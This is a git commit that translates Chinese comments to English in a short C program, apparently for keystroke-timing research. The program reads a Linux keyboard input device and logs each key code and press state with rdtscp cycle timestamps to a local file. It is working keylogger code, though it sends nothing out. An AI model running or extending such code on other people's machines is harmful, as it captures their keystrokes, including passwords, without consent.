c7065dc54e7181989d595a0f86a8830dfb9c376e
Yifeng Gao <62320364+fgd1988@users.noreply.github.com>
2026-03-06 12:38:14 +0800

    Update keylogger_rdtsc.c

--- Keystroke/keylogger_rdtsc.c
+++ Keystroke/keylogger_rdtsc.c
@@ -5,22 +5,22 @@
 #include <errno.h>
 #include <linux/input.h>
 
-// 函数声明
+
 void log_key_event(int type, int code, int value);
 
 int main() {
     struct input_event ev;
     int fd, rd;
-    const char *dev = "/dev/input/event3"; // 替换为你的键盘设备路径
+    const char *dev = "/dev/input/event3"; // Replace with the path of your keyboard device
 
-    // 打开键盘设备
+    // Turn on the keyboard device
     fd = open(dev, O_RDONLY);
     if (fd == -1) {
         perror("Cannot open device");
         exit(EXIT_FAILURE);
     }
 
-    // 创建日志文件
+
     FILE *logfile;
     char filename[100];
     snprintf(filename, sizeof(filename), "keylog_rdtscp.txt"); // 文件名可以根据需要修改
@@ -31,7 +31,7 @@ int main() {
     }
     fprintf(logfile, "Timestamp,Event,Key\n");
 
-    // 读取键盘事件并记录
+    // Read keyboard events and record them
     while (1) {
         rd = read(fd, &ev, sizeof(struct input_event));
         if (rd == -1) {
@@ -46,20 +46,20 @@ int main() {
         }
     }
 
-    // 关闭文件和设备
+    // Close the files and the devices.
     fclose(logfile);
     close(fd);
 
     return 0;
 }
 
-// 记录按键事件到日志文件
+// Record key events in the log file
 void log_key_event(int type, int code, int value) {
     FILE *logfile = fopen("keylog_rdtscp.txt", "a");
     unsigned int eax, edx;
     unsigned long long tsc;
 
-    // 使用rdtscp指令获取CPU周期计数器值
+    // Use the rdtscp instruction to obtain the CPU cycle counter value
     asm volatile ("rdtscp\n\t"
                   "mov %%eax, %0\n\t"
                   "mov %%edx, %1\n\t"
@@ -69,7 +69,7 @@ void log_key_event(int type, int code, int value) {
 
     tsc = ((unsigned long long)edx << 32) | eax;
 
-    // 将事件记录到文件
+    // Record the event in a file
     fprintf(logfile, "%llu,%s,%d\n", tsc, (value ? "Pressed" : "Released"), code);
     fclose(logfile);
 }
